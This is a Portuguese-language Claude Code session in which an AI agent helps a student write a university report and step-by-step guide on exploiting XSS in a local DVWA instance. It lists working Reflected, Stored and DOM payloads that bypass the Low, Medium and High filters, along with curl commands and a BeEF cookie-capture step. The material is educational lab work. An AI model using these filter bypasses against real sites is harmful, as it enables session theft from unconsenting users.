@@ -1,0 +1,2911 @@
+╭─── Claude Code v2.1.185 ─────────────────────────────────────────────────────╮
+│                                                │ Tips for getting started    │
+│               Welcome back Renan!              │ Run /init to create a CLAU… │
+│                                                │ ─────────────────────────── │
+│                     ▐▛███▜▌                    │ What's new                  │
+│                    ▝▜█████▛▘                   │ The stream-stall hint now … │
+│                      ▘▘ ▝▝                     │ Improved auto mode safety:… │
+│                                                │ Added a warning when the r… │
+│   Opus 4.8 · Claude Team · Atendare Dev Team   │ /release-notes for more     │
+│                  C:\www\DVWA                   │                             │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+
+❯ /model                                                                        
+  ⎿  Set model to Opus 4.8 (1M context) and saved as your default for new
+     sessions
+
+❯ /effort                                                                       
+  ⎿  Set effort level to max (this session only): Maximum capability with
+     deepest reasoning. May use excessive tokens resulting in long response
+     times or overthinking. Use sparingly for the hardest tasks.
+
+❯ /usage 
+  ⎿  Settings dialog dismissed
+
+❯ /effort                                                                       
+  ⎿  Set effort level to ultracode (this session only): xhigh + dynamic workflow
+     orchestration
+
+❯ @"4 - DVWA e Cross-Site Scripting (XSS).docx.md" preciso de ajuda para fazer  
+  esse trabalho, analise, me faça perguntas, pesquise na internet, esse é um    
+  trabalho para a faculdade de engenhenharia de software                        
+  ⎿  Read 4 - DVWA e Cross-Site Scripting (XSS).docx.md (48 lines)
+
+❯ /usage 
+  ⎿  Settings dialog dismissed
+
+● Vou carregar skill de brainstorming primeiro — tarefa colaborativa "me ajuda a
+  fazer esse trabalho" pede entender requisitos antes de agir.
+
+● Skill(superpowers:brainstorming)
+  ⎿  Successfully loaded skill
+
+● DVWA app é o próprio working dir. Vou explorar contexto antes de perguntar.
+
+  Searched for 3 patterns, read 9 files (ctrl+o to expand)
+
+● Analisei. Contexto técnico mapeado:
+
+  DVWA presente no working dir. 3 tipos XSS, cada um com 4 níveis:
+  - xss_r (Reflected) — param ?name=. Low sem filtro, Medium tira <script>
+  literal, High regex anti-script.
+  - xss_s (Stored) — guestbook (guardado no banco). Low sem sanitização, Medium
+  só protege message (campo name fura), High regex no name.
+  - xss_d (DOM) — seletor idioma ?default=. Low livre, Medium bloqueia <script,
+  High whitelist.
+
+  config/config.inc.php NÃO existe — só o .dist. DVWA provável não
+  configurado/rodando ainda.
+
+  Trabalho é relatório técnico ≤8 páginas pra faculdade. Antes de agir, preciso
+  travar escopo. 4 perguntas:
+
+● User declined to answer questions
+  ⎿  · O que você quer que eu faça neste trabalho? (Guiar execução + relatório /
+     Só escrever o relatório / Só guiar a execução)
+     · O DVWA já está rodando na sua máquina? (config.inc.php não existe ainda) 
+     (Não / preciso configurar / Sim, já rodando / Instalado mas não testei)
+     · Quais XSS cobrir no relatório? (3 tipos, Low→High / 3 tipos, só 
+     Low/Medium / Foco em 1-2 tipos)
+     · Além do navegador, quais ferramentas usar nas evidências? (a atividade 
+     pede explorar 'sem ser detectado', evitando automação massiva) (DevTools do
+     navegador / Burp Suite / BeEF / curl / linha de comando)
+
+● Beleza. Q1 entendido: dois arquivos — relatório completo + passo a passo.
+
+  Você quis esclarecer algo antes de responder o resto. O que quer
+  ajustar/perguntar? Pode ser sobre:
+
+  - As próprias perguntas (Q2 ambiente, Q3 cobertura, Q4 ferramentas) — se
+  alguma não fez sentido
+  - Formato dos arquivos (Markdown? pra colar no Word? PDF?)
+  - Idioma, estrutura, nível de detalhe
+  - Qualquer outra coisa do trabalho
+
+  Manda o que tá na cabeça.
+
+✻ Baked for 2m 8s
+
+❯ quero focar apenas no XSS, não usar SQL injection, continuar com outras       
+  perguntas                                                                     
+
+● Certo — foco XSS puro, zero SQL injection (alinhado com o trabalho). Seguindo
+  com as outras:
+
+● User answered Claude's questions:
+  ⎿  · O DVWA já está rodando na sua máquina? (config.inc.php ainda não existe) 
+     → estou rodando usando o dockerfile
+     · Quais XSS cobrir no relatório? → 3 tipos, Low→High
+     · Além do navegador, quais ferramentas usar nas evidências? (atividade pede
+     explorar 'sem ser detectado', sem automação massiva) → DevTools do 
+     navegador, curl / linha de comando, BeEF
+
+● Background command "Check Docker availability and running containers"
+completed (exit code 0)
+
+● Respostas travadas:
+  - Ambiente: Docker (rodando)
+  - Cobertura: 3 tipos, Low→High
+  - Ferramentas: DevTools, curl, BeEF (sem Burp)
+
+  Vou ler o estado do Docker + os sinks client-side restantes pra montar
+  payloads exatos, e carregar busca web (você pediu pesquisa).
+
+  Read 6 files (ctrl+o to expand)
+● Contexto técnico completo. Pontos-chave confirmados no código:
+
+  - DOM sink lê document.location.href via document.write → no High dá pra usar
+  fragmento # (servidor não vê o que vem depois do #).
+  - Stored tem maxlength=10 no campo name (só client-side) → curl/DevTools fura
+  isso. Campo name é o elo fraco no Medium/High.
+  - Docker: check de containers deu erro de pipe no instante, mas você confirmou
+  rodando. Vou tratar porta como http://localhost:<porta> e confirmo depois.
+
+  Pesquisa rápida pra fundamentar (você pediu) — payloads atuais, mitigações e
+  BeEF:
+
+● Web Search("DVWA DOM based XSS high level bypass payload fragment # default")
+  ⎿  Did 1 search in 7s
+
+● Web Search("OWASP XSS prevention cheat sheet CSP Trusted Types DOMPurify
+            HttpOnly SameSite 2025")
+  ⎿  Did 1 search in 9s
+
+● Web Search("BeEF hook stored XSS demonstrate cookie session steal tutorial")
+  ⎿  Did 1 search in 7s
+
+● Pesquisa confirma tudo (DOM high via fragmento #, mitigações OWASP, BeEF Get
+  Cookie). Vou checar o compose/Dockerfile pra pegar a porta exata antes de
+  fechar o desenho:
+
+  Searched for 1 pattern, read 2 files (ctrl+o to expand)
+
+● Tudo confirmado no compose:
+
+  - URL: http://localhost:4280 (porta 4280, bind em 127.0.0.1)
+  - Login: admin / password
+  - DB: dvwa / p@ssw0rd (auto-config no container)
+  - Security level muda na aba DVWA Security (default impossible)
+  - BeEF roda fora do container (porta padrão 3000) — hook injetado via Stored
+  Low
+
+  ---
+  Desenho proposto — 2 arquivos (Markdown, PT-BR, pra colar no Word)
+
+  Arquivo 1 — relatorio-xss-dvwa.md (entregável, ≤8 pág)
+
+  Segue exatamente a estrutura exigida pelo professor:
+
+  ┌───────────────┬─────────────────────────────────────────────────────────┐
+  │     Seção     │                        Conteúdo                         │
+  ├───────────────┼─────────────────────────────────────────────────────────┤
+  │ Capa          │ Integrantes (placeholder p/ preencher)                  │
+  ├───────────────┼─────────────────────────────────────────────────────────┤
+  │ Introdução    │ Contexto pentest web + DVWA + relevância XSS            │
+  ├───────────────┼─────────────────────────────────────────────────────────┤
+  │ Objetivos     │ Identificar pontos vulneráveis, observar comportamento, │
+  │               │  avaliar impacto                                        │
+  ├───────────────┼─────────────────────────────────────────────────────────┤
+  │ Ferramentas   │ DVWA (Docker), navegador+DevTools, curl, BeEF           │
+  ├───────────────┼─────────────────────────────────────────────────────────┤
+  │ Metodologia   │ Testes manuais incrementais, low→high, sem automação    │
+  │               │ massiva                                                 │
+  ├───────────────┼─────────────────────────────────────────────────────────┤
+  │ Resultados    │ Núcleo: matriz 3 tipos × 3 níveis + prosa focada +      │
+  │               │ [PRINT N] placeholders                                  │
+  ├───────────────┼─────────────────────────────────────────────────────────┤
+  │ Análise de    │ Impacto (sessão/cookie/defacement), riscos reais,       │
+  │ Segurança     │ mitigações OWASP (encoding, CSP, Trusted Types,         │
+  │               │ DOMPurify, HttpOnly/SameSite)                           │
+  ├───────────────┼─────────────────────────────────────────────────────────┤
+  │ Conclusão     │ Síntese + aprendizados + limitações                     │
+  └───────────────┴─────────────────────────────────────────────────────────┘
+
+  Arquivo 2 — passo-a-passo-xss-dvwa.md (operacional, você executa)
+
+  - Subir Docker, login, achar cookie PHPSESSID+security
+  - 9 cenários, cada um: URL/payload exato → como executar → o que printar →
+  resultado esperado → por que o filtro falha
+  - Bloco curl pronto (com cookies) — fura maxlength do Stored
+  - Bloco DevTools (editar maxlength, console)
+  - Bloco BeEF (subir, injetar hook via curl no Stored Low, módulo Get Cookie)
+  - Tabela "print X → seção Y do relatório"
+
+  Matriz técnica dos 9 cenários (payloads que vou usar)
+
+  Reflected (?name=)
+  - Low: <script>alert(document.cookie)</script>
+  - Medium (tira <script> literal): <img src=x onerror=alert(document.cookie)>
+  ou <sCRipt>
+  - High (regex anti-script): <svg/onload=alert(document.cookie)>
+
+  Stored (guestbook)
+  - Low: <script>alert(document.cookie)</script> no message
+  - Medium (message blindado, name só tira <script>): inject no name → <img 
+  src=x onerror=alert(1)> (fura maxlength via curl)
+  - High (name regex anti-script): <svg/onload=alert(1)> no name via curl
+
+  DOM (?default=)
+  - Low: ?default=<script>alert(document.cookie)</script>
+  - Medium (bloqueia <script): ?default=</option></select><img src=x 
+  onerror=alert(1)>
+  - High (whitelist server-side):
+  ?default=English#<script>alert(document.cookie)</script> (fragmento # não vai
+  ao servidor)
+
+  ---
+  Como o entregável já é o documento, proponho pular spec separado e ir direto
+  pros 2 arquivos após teu OK (evita burocracia redundante).
+
+  Aprova esse desenho ou quer ajustar algo? (ex: incluir nível Impossible como
+  "correção", mais/menos prints, tom mais acadêmico vs técnico)
+
+✻ Worked for 2m 48s
+
+❯ /copy                                                                         
+  ⎿  Copied to clipboard (3745 characters, 56 lines)
+     Also written to C:\Users\Renan\AppData\Local\Temp\claude\response.md
+
+❯ aprovado                                                                      
+
+● Aprovado. Ultracode on — vou orquestrar via workflow: análise profunda
+  paralela por tipo (lê código real), pesquisa de mitigações, redação dos 2
+  arquivos, revisão adversarial e finalização. Depois eu gravo os arquivos
+  finais.
+
+❯ /workflows 
+  ⎿  Dynamic workflows dialog dismissed
+
+● Workflow(Gera relatorio tecnico + passo-a-passo de XSS no DVWA
+          (Reflected/Stored/DOM, low->high))
+  ⎿  /workflows to view dynamic workflow runs
+
+● Workflow rodando em background (4 fases, ~7 agentes). Te aviso quando terminar
+  e gravo os 2 arquivos finais (relatorio-xss-dvwa.md +
+  passo-a-passo-xss-dvwa.md).
+
+  Acompanha ao vivo com /workflows se quiser.
+
+✻ Cooked for 2m 58s
+
+❯ /workflows 
+  ⎿  Dynamic workflows dialog dismissed
+
+❯ /usage 
+  ⎿  Settings dialog dismissed
+
+❯ /workflows 
+  ⎿  Dynamic workflows dialog dismissed
+
+❯ /usage 
+  ⎿  Settings dialog dismissed
+
+※ recap: Building two XSS-on-DVWA docs for your faculty assignment: a technical report and a step-by-step guide. A background workflow is drafting both now. Next: when it finishes, I write the final files. (disable recaps in /config)
+
+● Dynamic workflow "Gera relatorio tecnico + passo-a-passo de XSS no DVWA
+(Reflected/Stored/DOM, low-&gt;high)" completed · 23m 39s
+
+● Workflow concluído (9 agentes, 305k tokens). Resultado truncado na notificação
+  — leio o arquivo completo pra extrair os 2 docs + a revisão e checar
+  qualidade (vi entidades HTML &lt; escapadas, possível ajuste).
+
+  Read 1 file (ctrl+o to expand)
+
+● Workflow finalizou os 2 docs e a fase de finalização já aplicou o punch-list
+  (removeu menção a SQL/PDO no Low e no Impossible, adicionou notas de
+  PowerShell, troubleshooting do fragmento DOM High, e a ressalva do vetor
+  aninhado). Payloads conferidos: corretos. As entidades &lt; que vi antes eram
+  só do preview da notificação — no JSON real os payloads estão crus.
+
+  Gravando os 2 arquivos a partir do JSON (parse via .NET, UTF-8 sem BOM, fiel
+  ao conteúdo):
+● PowerShell($out = 'C:\Users\Renan\AppData\Local\Temp\claude\C--www-DVWA\e825f8
+            b0-8a9a-4c61-9d42-3e105b069fd3\tasks\wjaothe8j.output'
+            $j = Get-Content -Raw $out | ConvertFr…)
+  ⎿  relatorio: 18187 chars, 262 linhas
+     passo:     23689 chars, 488 linhas
+     … +4 lines (ctrl+o to expand)
+
+● Arquivos gravados. Verificação final: confirmar que a finalização removeu
+  mesmo qualquer menção a SQL/PDO/prepared (escopo proibido) dos arquivos
+  gravados:
+
+  Searched for 1 pattern (ctrl+o to expand)
+
+● Pronto. 2 arquivos gravados em C:\www\DVWA\, escopo XSS puro (zero
+  SQL/PDO/injection confirmado).
+
+  Entregáveis
+
+  relatorio-xss-dvwa.md (262 linhas) — entregável final. Segue exato a estrutura
+  do professor:
+  - Capa → Introdução → Objetivos → Ferramentas → Metodologia → Resultados →
+  Análise de Segurança → Conclusão
+  - Resultados: matriz 3×3 + subseções por tipo com payload, por que o filtro
+  falha, efeito client-side, placeholders [PRINT 1–9]
+  - Análise: impacto (cookie/sessão/defacement/worm), mitigações (encoding, CSP,
+  Trusted Types, DOMPurify, HttpOnly/SameSite), Impossible como correção
+  - Anexo A (mapa de prints) + Anexo B (BeEF)
+
+  passo-a-passo-xss-dvwa.md (488 linhas) — operacional. Subir Docker → pegar
+  cookies → mudar nível → 9 cenários prontos (URL + curl copia-cola) → bloco
+  DevTools (fura maxlength) → bloco BeEF → tabela PRINT → seção.
+
+  Matriz dos 9 cenários
+
+  ┌──────────┬──────────────────┬────────────────────────┬─────────────────┐
+  │   Tipo   │       Low        │         Medium         │      High       │
+  ├──────────┼──────────────────┼────────────────────────┼─────────────────┤
+  │ Reflecte │ <script>         │ <img onerror>          │ <svg/onload>    │
+  │ d        │                  │                        │                 │
+  ├──────────┼──────────────────┼────────────────────────┼─────────────────┤
+  │ Stored   │ <script>         │ <img onerror> (name)   │ <svg/onload>    │
+  │          │ (message)        │                        │ (name)          │
+  ├──────────┼──────────────────┼────────────────────────┼─────────────────┤
+  │ DOM      │ ?default=<script │ </option></select><img │ English#<script │
+  │          │ >                │ >                      │ > (fragmento #) │
+  └──────────┴──────────────────┴────────────────────────┴─────────────────┘
+
+  O que falta você fazer
+
+  1. Capa: trocar [PREENCHER] pelos integrantes.
+  2. Executar o passo a passo → tirar prints → substituir [PRINT N].
+  3. Converter MD→docx (Pandoc ou colar no Word).
+  4. Conferir ≤8 páginas após colar prints — se estourar, corta o Anexo B (BeEF)
+  e encurta os "Por que falha".
+
+  Avisos
+
+  - PowerShell: comandos curl do bloco 6 já estão em 1 linha (funcionam no teu
+  PS). Os multi-linha (BeEF) usam \ do bash — no PS troca por crase ` ou usa
+  linha única.
+  - DOM High: navegador moderno pode percent-encodar < no fragmento
+  (%3Cscript%3E) e o decodeURI não desfaz → guia tem troubleshooting. Cola a URL
+  direto na barra.
+  - Inconsistência cosmética conhecida: matriz usa alert(document.cookie) no
+  Stored Med/High, mas os curl do corpo usam alert(1). Ambos funcionam. Quer que
+  eu padronize tudo pra document.cookie?
+
+  Posso também rodar os curl ao vivo agora (Docker tá de pé) pra gerar evidência
+  textual real da reflexão/persistência no HTML — reforça o relatório. Quer?
+
+  Fontes da pesquisa: OWASP XSS Prevention (https://cheatsheetseries.owasp.org/c
+  heatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), DVWA DOM XSS
+  bypass (https://ethicalhacs.com/dvwa-dom-xss-exploit/), BeEF Project
+  (https://beefproject.com/).
+
+✻ Cooked for 28m 23s
+
+※ recap: Trabalho de faculdade sobre XSS no DVWA: gerei dois arquivos em C:\www\DVWA (relatório técnico e passo a passo dos 9 cenários). Próximo passo: você decide se eu rodo os curl ao vivo pra gerar evidência textual real. (disable recaps in /config)
+
+❯ o limite são 8 páginas além da capa, fiz upload para o google docs e deu um   
+  total de 11 páginas além da página da capa que eu fiz a quebra de página,     
+  pense em como diminuir o conteudo do relatorio final                          
+  ⎿  ⧉ Selected 262 lines from relatorio-xss-dvwa.md in Visual Studio Code
+
+● 11 páginas → preciso cortar ~30%. Diagnóstico do que pesa: blocos curl no
+  relatório (são largos e duplicados no passo a passo), os 2 Anexos (também
+  duplicados), e prosa longa. Cortes seguros — nada de substância some, só sai o
+  que já está no guia operacional.
+
+  Plano de corte:
+  - Remover todos os blocos curl do relatório (ficam só no passo a passo)
+  - Cortar Anexo A (mapa de prints) e Anexo B (BeEF) → já estão no passo a
+  passo; 6.4 mantém o resumo BeEF
+  - Comprimir "por que falha" pra 1 linha cada
+  - Enxugar Introdução, Metodologia, Conclusão e tabela de mitigações
+  - Padronizar alert(document.cookie) (corrige a inconsistência cosmética de
+  brinde)
+
+  Reescrevendo o relatório condensado:
+
+● Write(relatorio-xss-dvwa.md)
+  ⎿  Error writing file
+
+  Read 1 file (ctrl+o to expand)
+
+● Write(relatorio-xss-dvwa.md)
+  ⎿  Added 52 lines, removed 176 lines
+       16  
+       17  ## 1. Introdução
+       18  
+       19 -Este relatório documenta uma atividade de *pentest* (teste de 
+          -intrusão) conduzida sobre a aplicação **DVWA** (Damn Vulnerabl
+          -e Web Application), um ambiente web propositalmente vulnerável
+          - amplamente utilizado para fins didáticos. O foco exclusivo da
+          - análise foi a classe de vulnerabilidades **Cross-Site Scripti
+          -ng (XSS)**, que ocorre quando uma aplicação incorpora dados co
+          -ntrolados pelo usuário em suas respostas sem a devida validaçã
+          -o ou codificação, permitindo a execução de código JavaScript a
+          -rbitrário no navegador da vítima.                             
+       19 +Este relatório documenta uma atividade de *pentest* conduzida 
+          +sobre a aplicação **DVWA** (Damn Vulnerable Web Application), 
+          +ambiente web propositalmente vulnerável usado para fins didáti
+          +cos. O foco exclusivo foi **Cross-Site Scripting (XSS)** — fal
+          +ha que ocorre quando a aplicação incorpora dados controlados p
+          +elo usuário na resposta sem validação ou codificação adequada,
+          + permitindo a execução de JavaScript arbitrário no navegador d
+          +a vítima.                                                     
+       20  
+       21 -O XSS é uma das falhas mais persistentes em aplicações web (pr
+          -esente historicamente no OWASP Top 10) justamente porque deriv
+          -a de erros conceituais simples: tratar **entrada do usuário co
+          -mo código** em vez de **dado**. As consequências variam de rou
+          -bo de sessão e *defacement* até campanhas de *phishing* hosped
+          -adas no próprio domínio legítimo. A relevância da atividade es
+          -tá em compreender, de forma prática e incremental, como falhas
+          - de validação e sanitização viabilizam a execução client-side 
+          -de scripts e como mitigá-las corretamente.                    
+       21 +O XSS é uma das falhas mais persistentes em aplicações web (hi
+          +stórico no OWASP Top 10) por derivar de um erro conceitual sim
+          +ples: tratar **entrada do usuário como código** em vez de **da
+          +do**. As consequências vão de roubo de sessão e *defacement* a
+          + campanhas de *phishing* hospedadas no próprio domínio legítim
+          +o. O ambiente analisado roda em Docker, exposto localmente em 
+          +`http://localhost:4280` (bind `127.0.0.1`, isolado), com nívei
+          +s de segurança ajustáveis (Low, Medium, High, Impossible) na a
+          +ba *DVWA Security*.                                           
+       22  
+       23 -O ambiente analisado roda em contêiner Docker, exposto localme
+          -nte em `http://localhost:4280` (bind em `127.0.0.1`, isolado d
+          -a rede externa), com os níveis de segurança configuráveis (Low
+          -, Medium, High, Impossible) na aba *DVWA Security*.           
+       24 -                                                              
+       23  ## 2. Objetivos da Análise
+       24  
+       27 -- **Identificar** os pontos da aplicação vulneráveis a XSS nos
+          - três módulos: Reflected (`xss_r`), Stored (`xss_s`) e DOM-bas
+          -ed (`xss_d`).                                                 
+       28 -- **Compreender** o comportamento da interface diante de entra
+          -das maliciosas, observando como cada nível de segurança tenta 
+          -(e falha em) filtrar payloads.                                
+       29 -- **Avaliar** o impacto real da execução de scripts no context
+          -o client-side — roubo de cookies, sequestro de sessão e ações 
+          -autenticadas forjadas.                                        
+       30 -- **Contrastar** as defesas baseadas em *blacklist* (níveis Me
+          -dium/High) com a abordagem correta de *output encoding* contex
+          -tual (nível Impossible).                                      
+       25 +- **Identificar** os pontos vulneráveis a XSS nos três módulos
+          +: Reflected (`xss_r`), Stored (`xss_s`) e DOM-based (`xss_d`).
+       26 +- **Compreender** o comportamento da interface diante de entra
+          +das maliciosas e como cada nível tenta (e falha em) filtrar pa
+          +yloads.                                                       
+       27 +- **Avaliar** o impacto da execução de scripts no client-side 
+          +— roubo de cookies, sequestro de sessão e ações autenticadas f
+          +orjadas.                                                      
+       28 +- **Contrastar** defesas por *blacklist* (Medium/High) com a a
+          +bordagem correta de *output encoding* contextual (Impossible).
+       29  
+       30  ## 3. Ferramentas Utilizadas
+       31  
+       32  | Ferramenta | Uso na atividade |
+       33  |---|---|
+       36 -| **DVWA** (Docker, `localhost:4280`) | Aplicação-alvo vulnerá
+          -vel, com níveis de segurança ajustáveis. |                    
+       37 -| **Navegador + DevTools** (Console / Inspector / Network) | S
+          -ubmissão de payloads via URL e formulário; inspeção do DOM ren
+          -derizado e das requisições. |                                 
+       38 -| **curl** (linha de comando) | Evidência bruta da reflexão/pe
+          -rsistência no HTML; bypass de validações `maxlength` que são a
+          -penas client-side. |                                          
+       39 -| **BeEF** (Browser Exploitation Framework, porta 3000) | Demo
+          -nstração de impacto pós-exploração (*hook* do navegador e capt
+          -ura de cookies). |                                            
+       34 +| **DVWA** (Docker, `localhost:4280`) | Aplicação-alvo vulnerá
+          +vel, níveis ajustáveis. |                                     
+       35 +| **Navegador + DevTools** | Submissão de payloads; inspeção d
+          +o DOM e das requisições. |                                    
+       36 +| **curl** | Evidência bruta da reflexão/persistência no HTML;
+          + *bypass* de `maxlength` (só client-side). |                  
+       37 +| **BeEF** (porta 3000) | Demonstração de impacto pós-exploraç
+          +ão (*hook* do navegador e captura de cookies). |              
+       38  
+       39  ## 4. Metodologia Aplicada
+       40  
+       43 -A exploração seguiu uma abordagem **manual, incremental e cont
+          -rolada**, alinhada à restrição de evitar automação massiva ou 
+          -técnicas agressivas. Para cada um dos três tipos de XSS, perco
+          -rreu-se a progressão de níveis **Low → Medium → High**, sempre
+          -:                                                             
+       41 +A exploração foi **manual, incremental e controlada**, alinhad
+          +a à restrição de evitar automação massiva. Para cada tipo, per
+          +correu-se a progressão **Low → Medium → High**: (1) leitura do
+          + código-fonte do nível para entender a barreira; (2) construçã
+          +o do *payload* mínimo capaz de contorná-la; (3) submissão via 
+          +URL, formulário ou `curl`; (4) observação do efeito no cliente
+          + e registro da evidência. O critério foi **orientado a impacto
+          +** (demonstrar `document.cookie`). O nível **Impossible** foi 
+          +analisado como referência de correção, não como alvo.         
+       42  
+       45 -1. Lendo o código-fonte do nível (disponível na própria interf
+          -ace DVWA) para entender a barreira de defesa aplicada.        
+       46 -2. Construindo o **payload mínimo** capaz de contornar aquela 
+          -barreira.                                                     
+       47 -3. Submetendo o vetor via URL (GET), formulário ou `curl`, con
+          -forme o tipo.                                                 
+       48 -4. Observando o efeito no cliente (execução do `alert`, estado
+          - do DOM, persistência) e registrando a evidência.             
+       49 -                                                              
+       50 -O critério de payload foi **orientado a impacto** (demonstrar 
+          -`document.cookie`) e à mínima pegada possível, sem varreduras 
+          -automatizadas. O nível **Impossible** foi analisado como refer
+          -ência de correção, não como alvo de bypass.                   
+       51 -                                                              
+       43  ## 5. Resultados Obtidos
+       44  
+       45  ### 5.1 Matriz de Resultados
+       46  
+       47  | Tipo | Nível | Payload | Comportamento observado |
+       48  |---|---|---|---|
+       58 -| Reflected (`xss_r`) | Low | `<script>alert(document.cookie)<
+          -/script>` | `alert` com o cookie dispara imediatamente; tag re
+          -fletida literal dentro de `<pre>`. |                          
+       59 -| Reflected (`xss_r`) | Medium | `<img src=x onerror=alert(doc
+          -ument.cookie)>` | Imagem quebrada dispara `onerror`; `alert` c
+          -om o cookie. |                                                
+       60 -| Reflected (`xss_r`) | High | `<svg/onload=alert(document.coo
+          -kie)>` | `<svg>` parseado dispara `onload` sem interação; `ale
+          -rt` com o cookie. |                                           
+       61 -| Stored (`xss_s`) | Low | `<script>alert(document.cookie)</sc
+          -ript>` | Executa a cada visita à página; payload persistido no
+          - banco. |                                                     
+       62 -| Stored (`xss_s`) | Medium | `<img src=x onerror=alert(docume
+          -nt.cookie)>` (campo `name`) | `onerror` dispara em toda visita
+          -; campo Message está blindado. |                              
+       63 -| Stored (`xss_s`) | High | `<svg/onload=alert(document.cookie
+          -)>` (campo `name`) | `onload` dispara em toda visita; persiste
+          -nte. |                                                        
+       64 -| DOM (`xss_d`) | Low | `<script>alert(document.cookie)</scrip
+          -t>` | `document.write` injeta o script; `alert` dispara, `<sel
+          -ect>` quebrado. |                                             
+       65 -| DOM (`xss_d`) | Medium | `</option></select><img src=x onerr
+          -or=alert(document.cookie)>` | Quebra do contexto `<select>` pe
+          -rmite `<img>`; `onerror` dispara. |                           
+       66 -| DOM (`xss_d`) | High | `English#<script>alert(document.cooki
+          -e)</script>` | Fragmento `#` não trafega ao servidor; sink lê 
+          -`location.href` e executa. |                                  
+       49 +| Reflected | Low | `<script>alert(document.cookie)</script>` 
+          +| `alert` dispara; tag refletida literal em `<pre>`. |        
+       50 +| Reflected | Medium | `<img src=x onerror=alert(document.cook
+          +ie)>` | imagem quebrada dispara `onerror`. |                  
+       51 +| Reflected | High | `<svg/onload=alert(document.cookie)>` | `
+          +onload` dispara sem interação. |                              
+       52 +| Stored | Low | `<script>alert(document.cookie)</script>` | e
+          +xecuta a cada visita; persistido no banco. |                  
+       53 +| Stored | Medium | `<img src=x onerror=alert(document.cookie)
+          +>` (`name`) | `onerror` a cada visita; Message blindado. |    
+       54 +| Stored | High | `<svg/onload=alert(document.cookie)>` (`name
+          +`) | `onload` a cada visita; persistente. |                   
+       55 +| DOM | Low | `<script>alert(document.cookie)</script>` | `doc
+          +ument.write` injeta o script; `<select>` quebrado. |          
+       56 +| DOM | Medium | `</option></select><img src=x onerror=alert(d
+          +ocument.cookie)>` | quebra do contexto `<select>` libera o `<i
+          +mg>`. |                                                       
+       57 +| DOM | High | `English#<script>alert(document.cookie)</script
+          +>` | fragmento `#` não vai ao servidor; sink lê `location.href
+          +`. |                                                          
+       58  
+       68 -> Evidências visuais: [PRINT 1] a [PRINT 9] — ver **Anexo A**,
+          - referenciadas nas subseções.                                 
+       59 +> Evidências `[PRINT 1]` a `[PRINT 9]` inseridas nas subseções
+          + abaixo. Comandos `curl` reprodutíveis e procedimento BeEF det
+          +alhado constam no guia operacional (documento *passo a passo*)
+          +.                                                             
+       60  
+       61  ### 5.2 Reflected XSS (`xss_r`)
+       62  
+       72 -O parâmetro GET `name` é refletido na mesma resposta, dentro d
+          -e `<pre>Hello {name}</pre>` — contexto de corpo HTML, sem codi
+          -ficação de saída.                                             
+       63 +Parâmetro GET `name` refletido em `<pre>Hello {name}</pre>` — 
+          +contexto de corpo HTML, sem codificação de saída.             
+       64  
+       74 -**Low** — Nenhum filtro. A entrada é concatenada crua e o cabe
+          -çalho `X-XSS-Protection: 0` ainda desliga o filtro legado do n
+          -avegador.                                                     
+       65 +- **Low** — sem filtro; o `header X-XSS-Protection: 0` ainda d
+          +esliga o filtro legado do navegador. Payload `<script>alert(do
+          +cument.cookie)</script>` chega intacto e executa. **[PRINT 1]*
+          +*                                                             
+       66 +- **Medium** — *blacklist* `str_replace('<script>', '', ...)` 
+          +(case-sensitive, passada única). `<img src=x onerror=alert(doc
+          +ument.cookie)>` não contém a string literal `<script>` e passa
+          +. Equivalentes: `<sCRipt>` (caixa) e `<scr<script>ipt>` (a rem
+          +oção reconstrói `<script>`). **[PRINT 2]**                    
+       67 +- **High** — regex `/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i` mira s
+          +ó a sequência *script*. `<svg/onload=alert(document.cookie)>` 
+          +não a contém; *event handlers* ficam fora do filtro. **[PRINT 
+          +3]**                                                          
+       68  
+       76 -```html                                                       
+       77 -<script>alert(document.cookie)</script>                       
+       78 -```                                                           
+       79 -                                                              
+       80 -```bash                                                       
+       81 -curl -s -G 'http://localhost:4280/vulnerabilities/xss_r/' \   
+       82 -  --data-urlencode 'name=<script>alert(document.cookie)</scrip
+          -t>' \                                                         
+       83 -  -b 'PHPSESSID=<SEU_PHPSESSID>; security=low'                
+       84 -```                                                           
+       85 -                                                              
+       86 -*Por que falha:* markup chega intacto e o motor JS executa. **
+          -[PRINT 1]**                                                   
+       87 -                                                              
+       88 -**Medium** — *Blacklist*: `str_replace('<script>', '', $_GET['
+          -name'])`. Case-sensitive, passada única não-recursiva, mira só
+          - a tag de abertura.                                           
+       89 -                                                              
+       90 -```html                                                       
+       91 -<img src=x onerror=alert(document.cookie)>                    
+       92 -```                                                           
+       93 -                                                              
+       94 -*Por que falha:* o payload não contém a substring literal `<sc
+          -ript>`, logo passa intacto e o handler `onerror` executa. Bypa
+          -sses equivalentes: `<sCRipt>...</sCRipt>` (caixa diferente) e 
+          -`<scr<script>ipt>...` (a remoção reconstrói um `<script>` váli
+          -do). **[PRINT 2]**                                            
+       95 -                                                              
+       96 -**High** — Regex case-insensitive `/<(.*)s(.*)c(.*)r(.*)i(.*)p
+          -(.*)t/i` remove qualquer variação de *script* após `<`.       
+       97 -                                                              
+       98 -```html                                                       
+       99 -<svg/onload=alert(document.cookie)>                           
+      100 -```                                                           
+      101 -                                                              
+      102 -*Por que falha:* a regex mira só a sequência `s-c-r-i-p-t`; `<
+          -svg/onload>` não a contém e os *event handlers* ficam fora do 
+          -filtro. **[PRINT 3]**                                         
+      103 -                                                              
+       69  ### 5.3 Stored XSS (`xss_s`)
+       70  
+      106 -Guestbook persistente. A rotina de renderização (`dvwaGuestboo
+          -k`) ecoa `name` e `comment` crus, sem codificação de saída — e
+          -xceto no nível Impossible. O payload executa para **todo** vis
+          -itante. Os limites `maxlength` (10 em `txtName`, 50 em `mtxMes
+          -sage`) são apenas client-side e ignorados por `curl`.         
+       71 +Guestbook persistente — o payload executa para **todo** visita
+          +nte. A renderização (`dvwaGuestbook`) ecoa `name` e `comment` 
+          +crus (sem codificação de saída, exceto no Impossible). Os limi
+          +tes `maxlength` (10 em `name`, 50 em `message`) são só client-
+          +side e ignorados por `curl`/DevTools.                         
+       72  
+      108 -**Low** — No nível Low **não há nenhuma codificação de saída H
+          -TML**: `htmlspecialchars()` está ausente e a renderização impr
+          -ime os valores brutos no corpo da página. Por isso a tag `<scr
+          -ipt>` é interpretada como markup, persiste e executa a cada ca
+          -rregamento.                                                   
+       73 +- **Low** — nenhuma codificação de saída (`htmlspecialchars` a
+          +usente); `<script>alert(document.cookie)</script>` no campo Me
+          +ssage persiste e executa. **[PRINT 4]**                       
